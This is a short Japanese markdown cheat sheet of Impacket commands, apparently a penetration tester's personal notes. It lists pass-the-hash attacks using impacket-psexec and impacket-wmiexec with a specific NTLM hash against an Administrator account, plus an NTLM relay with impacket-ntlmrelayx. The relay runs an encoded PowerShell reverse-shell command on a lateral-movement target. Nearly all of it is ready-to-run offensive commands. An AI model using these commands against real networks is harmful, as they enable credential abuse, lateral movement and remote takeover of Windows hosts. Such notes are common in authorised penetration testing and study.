# impacket

## コマンド集

1. PtHを使って管理者権限のシェルを取る。この時、NTLMハッシュの形式は**LMハッシュ:NTハッシュ**の形式になっている。  
NTLMハッシュのみを使用する場合は、LMハッシュ部分は0で埋めておく。
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

2. wmiexecを使ってPtWを行う
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
``

3. Net-NTLMv2 relay攻撃を行うため、中継元のWindows端末からdirなどでSMB接続をこの端末にさせ、コマンドを192.168.201.212という横展開先に送り付ける。  
これで、192.168.201.212上でPowerShellのリバースシェルコマンドを実行してシェルを取れる。-encの後ろはb64
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.201.212 -c "powershell -enc JABjAGwAaQBlAG..."
```